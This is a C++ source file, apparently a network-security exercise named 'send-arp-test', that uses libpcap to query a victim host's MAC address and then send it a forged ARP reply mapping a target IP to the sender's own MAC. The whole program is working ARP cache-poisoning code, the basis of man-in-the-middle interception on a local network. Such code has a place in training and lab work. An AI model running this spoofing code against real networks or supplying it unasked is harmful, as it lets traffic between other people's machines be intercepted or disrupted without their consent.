#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <iostream>
#include <pcap.h>
#include <set>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "ip.h"
#include "mac.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

unsigned char* get_my_MAC(char* iface) {
    int fd;
    struct ifreq ifr;
    unsigned char *mac = NULL;
    memset(&ifr, 0, sizeof(ifr));
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name , iface , IFNAMSIZ-1);
    if (0 == ioctl(fd, SIOCGIFHWADDR, &ifr)) {
        mac = (unsigned char *)ifr.ifr_hwaddr.sa_data;
	}
    close(fd);
    return mac;
}
char* get_my_IP(const char *iface) {
    int fd;
    struct ifreq ifr;
    static char ip[INET_ADDRSTRLEN]; // IP 주소를 저장할 버퍼
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) {
        perror("socket");
        return NULL;
    }
    memset(&ifr, 0, sizeof(ifr));
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ-1);
    if (ioctl(fd, SIOCGIFADDR, &ifr) == 0) {
        struct sockaddr_in *ipaddr = (struct sockaddr_in *)&ifr.ifr_addr;
        inet_ntop(AF_INET, &ipaddr->sin_addr, ip, sizeof(ip));
        printf("IP Address of %s: %s\n", iface, ip);
    } else {
        perror("ioctl");
        close(fd);
        return NULL;
    }

    close(fd);
    return ip;
 }


Mac get_sender_MAC(char* dev, Ip s_IP, Ip m_IP,Mac m_MAC){
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
	}

	EthArpPacket packet;

	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	packet.eth_.smac_ = m_MAC;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = m_MAC;
	packet.arp_.sip_ = htonl(m_IP);
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(s_IP);

	int res_send = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res_send != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res_send, pcap_geterr(handle));
	}
	struct pcap_pkthdr *header;
	const unsigned char *pkt_data;
	int res_get = pcap_next_ex(handle,&header,&pkt_data);
	if (res_get != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res_get, pcap_geterr(handle));
	}
	Mac ret_MAC(pkt_data);
	pcap_close(handle);
	return ret_MAC;
}

void spoofing(char* dev, Mac s_MAC,Mac m_MAC,Ip s_IP, Ip t_IP){
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return ;
	}

	EthArpPacket packet;

	packet.eth_.dmac_ = s_MAC;
	packet.eth_.smac_ = m_MAC;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = m_MAC;
	packet.arp_.sip_ = htonl(t_IP);
	packet.arp_.tmac_ = s_MAC;
	packet.arp_.tip_ = htonl(s_IP);

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	pcap_close(handle);
}

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

int main(int argc, char* argv[]) {
	if (argc%2 != 0||argc==2) {
		usage();
		return -1;
	}

	std::set<Ip> s;
	char* dev = argv[1];
	for(int i=1;i<argc/2;i++){
		Ip send_IP(argv[i*2]);
		Ip tar_IP(argv[i*2+1]);
		char errbuf[PCAP_ERRBUF_SIZE];
		unsigned char* my_MAC = get_my_MAC(dev);
		char* my_ip=get_my_IP(dev);
		Ip my_IP(my_ip);
		Mac send_MAC(get_sender_MAC(dev,send_IP,my_IP,my_MAC));
		spoofing(dev,send_MAC,my_MAC,send_IP,tar_IP);
		s.insert(send_IP);
	}
	return 0;
}
